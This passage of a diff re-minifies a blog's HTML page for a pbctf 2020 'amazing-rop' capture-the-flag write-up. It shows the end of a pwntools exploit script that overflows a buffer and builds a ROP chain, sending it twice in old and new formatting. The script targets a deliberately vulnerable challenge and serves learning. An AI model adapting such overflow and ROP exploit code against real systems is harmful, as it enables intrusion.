+    ebpaddress <span style=color:#f92672>=</span> values[<span style=color:#ae81ff>7</span>] <span style=color:#f92672>+</span> values[<span style=color:#ae81ff>6</span>] <span style=color:#f92672>+</span> values[<span style=color:#ae81ff>5</span>] <span style=color:#f92672>+</span> values[<span style=color:#ae81ff>4</span>]
+    ebpaddress <span style=color:#f92672>=</span> int(ebpaddress, <span style=color:#ae81ff>16</span>)
 
-    <span style="color:#75715e"># Write &#34;flag&#34; to the required location</span>
-    buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">48</span>
-    buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x67616c66</span>)
+    <span style=color:#75715e># Write &#34;flag&#34; to the required location</span>
+    buf <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>48</span>
+    buf <span style=color:#f92672>+=</span> p32(<span style=color:#ae81ff>0x67616c66</span>)
 
-    <span style="color:#75715e"># Junk values to reach the return address that also happen to be valid addresses</span>
-    buf <span style="color:#f92672">+=</span> p32(ebpaddress)
-    buf <span style="color:#f92672">+=</span> p32(ebpaddress)
-    buf <span style="color:#f92672">+=</span> p32(ebpaddress)
+    <span style=color:#75715e># Junk values to reach the return address that also happen to be valid addresses</span>
+    buf <span style=color:#f92672>+=</span> p32(ebpaddress)
+    buf <span style=color:#f92672>+=</span> p32(ebpaddress)
+    buf <span style=color:#f92672>+=</span> p32(ebpaddress)
 
-    <span style="color:#75715e"># Build the ROP chain</span>
-    <span style="color:#75715e"># mov eax, 1</span>
-    buf <span style="color:#f92672">+=</span> p32(baseaddr <span style="color:#f92672">+</span> moveax)  <span style="color:#75715e"># First return address</span>
-    <span style="color:#75715e"># Junk values to fix the stupid leave instruction (also valid addresses)</span>
-    buf <span style="color:#f92672">+=</span> p32(baseaddr <span style="color:#f92672">+</span> <span style="color:#ae81ff">43</span>)
-    buf <span style="color:#f92672">+=</span> p32(baseaddr <span style="color:#f92672">+</span> <span style="color:#ae81ff">43</span>)
-    buf <span style="color:#f92672">+=</span> p32(baseaddr <span style="color:#f92672">+</span> <span style="color:#ae81ff">43</span>)
+    <span style=color:#75715e># Build the ROP chain</span>
+    <span style=color:#75715e># mov eax, 1</span>
+    buf <span style=color:#f92672>+=</span> p32(baseaddr <span style=color:#f92672>+</span> moveax)  <span style=color:#75715e># First return address</span>
+    <span style=color:#75715e># Junk values to fix the stupid leave instruction (also valid addresses)</span>
+    buf <span style=color:#f92672>+=</span> p32(baseaddr <span style=color:#f92672>+</span> <span style=color:#ae81ff>43</span>)
+    buf <span style=color:#f92672>+=</span> p32(baseaddr <span style=color:#f92672>+</span> <span style=color:#ae81ff>43</span>)
+    buf <span style=color:#f92672>+=</span> p32(baseaddr <span style=color:#f92672>+</span> <span style=color:#ae81ff>43</span>)
 
-    <span style="color:#75715e"># mov edi, 0x31337; mov esi, 0x1337</span>
-    buf <span style="color:#f92672">+=</span> p32(baseaddr <span style="color:#f92672">+</span> pop3ret)
-    buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x1337</span>)  <span style="color:#75715e"># esi</span>
-    buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x31337</span>)  <span style="color:#75715e"># edi</span>
-    buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)  <span style="color:#75715e"># ebp</span>
+    <span style=color:#75715e># mov edi, 0x31337; mov esi, 0x1337</span>
+    buf <span style=color:#f92672>+=</span> p32(baseaddr <span style=color:#f92672>+</span> pop3ret)
+    buf <span style=color:#f92672>+=</span> p32(<span style=color:#ae81ff>0x1337</span>)  <span style=color:#75715e># esi</span>
+    buf <span style=color:#f92672>+=</span> p32(<span style=color:#ae81ff>0x31337</span>)  <span style=color:#75715e># edi</span>
+    buf <span style=color:#f92672>+=</span> p32(<span style=color:#ae81ff>0xdeadbeef</span>)  <span style=color:#75715e># ebp</span>
 
-    <span style="color:#75715e"># int3</span>
-    buf <span style="color:#f92672">+=</span> p32(baseaddr <span style="color:#f92672">+</span> int3)
+    <span style=color:#75715e># int3</span>
+    buf <span style=color:#f92672>+=</span> p32(baseaddr <span style=color:#f92672>+</span> int3)
 
-    r<span style="color:#f92672">.</span>sendline(buf)
-    r<span style="color:#f92672">.</span>interactive()
+    r<span style=color:#f92672>.</span>sendline(buf)
+    r<span style=color:#f92672>.</span>interactive()
 
-<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
     main()
-</code></pre></div><p><img src="https://raw.githubusercontent.com/starfleetcadet75/writeups/master/2020-pbctf/amazing-rop/flag.png" alt="flag"></p>
- </div>
-    <footer class="post-footer">
-
-  <div class="post-footer-data">
-            
-<div class="tags">
-  
-    
-      <div class="tag">
-        <a href="/tags/exploitation">#exploitation</a>
-      </div>
-    
-  
-</div>
-
-    <div class="post-footer-meta">Permalink: <a href="https://starfleetcadet75.github.io/posts/pbctf-2020-amazing-rop/">/posts/pbctf-2020-amazing-rop/</a> | Date: 2020-12-07 </div>
-    
-    <hr>
-            
-<div class="categories">
-  
-  Published in:
-    
-      <div class="category">
-        <a href="/categories/writeups">writeups</a>
-      </div>
-    
-  
-</div>
-
-            
-<div class="series">
-  
-</div>
-
-    
-  </div>
-</footer>
-
-
-
-</article>
-
-  <footer>
-
-  <div class="social-links-footer">
-
-  
-  <a href="mailto:starfleetcadet75@gmail.com"><div class="social-link">Email</div></a>
-  
-
-  
-  <a href="https://github.com/starfleetcadet75" target="_blank"><div class="social-link">GitHub</div></a>
-  
-
-  
-  <a href="https://gitlab.com/starfleetcadet75" target="_blank"><div class="social-link">GitLab</div></a>
-  
-
-  
-
-  
-
-  <div class="social-link">
-  <a href="https://starfleetcadet75.github.io/index.xml" target="_blank">RSS</a>
-  </div>
-
-</div>
-
-
-  <div class="copyright">  </div>
-
-  <div class="poweredby">
-    Powered by <a href="https://gohugo.io/">Hugo</a>.
-  </div>
-
-  </footer>
-
-</div> 
-
-</body>
-</html>
-
+</code></pre></div><p><img src=https://raw.githubusercontent.com/starfleetcadet75/writeups/master/2020-pbctf/amazing-rop/flag.png alt=flag></p></div><footer class=post-footer><div class=post-footer-data><div class=tags><div class=tag><a href=/tags/exploitation>#exploitation</a></div></div><div class=post-footer-meta>Permalink: <a href=https://starfleetcadet75.github.io/posts/pbctf-2020-amazing-rop/>/posts/pbctf-2020-amazing-rop/</a> | Date: 2020-12-07</div><hr><div class=categories>Published in:<div class=category><a href=/categories/writeups>writeups</a></div></div><div class=series></div></div></footer></article><footer><div class=social-links-footer><a href=mailto:starfleetcadet75@gmail.com><div class=social-link>Email</div></a><a href=https://github.com/starfleetcadet75 target=_blank><div class=social-link>GitHub</div></a><a href=https://gitlab.com/starfleetcadet75 target=_blank><div class=social-link>GitLab</div></a><div class=social-link><a href=https://starfleetcadet75.github.io/index.xml target=_blank>RSS</a></div></div><div class=copyright></div><div class=poweredby>Powered by <a href=https://gohugo.io/>Hugo</a>.</div></footer></div></body></html>
